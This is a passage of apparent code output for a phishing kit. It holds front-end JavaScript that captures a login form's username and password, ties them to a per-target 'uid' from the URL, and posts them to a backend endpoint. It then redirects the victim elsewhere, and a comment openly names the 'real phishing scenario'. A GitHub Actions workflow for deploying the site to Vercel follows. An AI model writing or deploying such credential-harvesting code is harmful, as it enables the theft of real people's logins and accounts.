document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent default form submission

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const errorMessage = document.getElementById('errorMessage');

    // Extract the UID from the URL
    const urlParams = new URLSearchParams(window.location.search);
    const uid = urlParams.get('uid');

    if (!uid) {
        errorMessage.textContent = 'Error: Missing user ID in URL. Cannot submit credentials.';
        errorMessage.style.display = 'block';
        return;
    }

    const data = {
        username: username,
        password: password,
        uid: uid
    };

    // Send data to your Vercel API endpoint
    fetch(window.location.origin + '/api/api', { // Assuming the API is on the same domain
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(result => {
        if (result.status === 'success') {
            // Simulate a redirect or show a success message
            // In a real phishing scenario, you'd redirect to the legitimate site
            window.location.href = "https://www.google.com"; // Example redirect
        } else {
            errorMessage.textContent = 'Login failed. Please try again.';
            errorMessage.style.display = 'block';
            console.error('Error submitting credentials:', result.message);
        }
    })
    .catch(error => {
        errorMessage.textContent = 'An error occurred. Please try again later.';
        errorMessage.style.display = 'block';
        console.error('Network error:', error);
    });
});```

---

**`.github/workflows/deploy.yml` (GitHub Actions for Vercel Deployment):**

```yaml
name: Deploy to Vercel

on:
  push:
    branches:
      - main # or master

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Install Vercel CLI
        run: npm install --global vercel@latest
      - name: Pull Vercel Environment Information
        run: vercel pull --yes --environment=production --token=${{ secrets.VERCEL_TOKEN }}
      - name: Build Project Artifacts
        run: vercel build --prod --token=${{ secrets.VERCEL_TOKEN }}
      - name: Deploy to Vercel
        run: vercel deploy --prebuilt --prod --token=${{ secrets.VERCEL_TOKEN }}
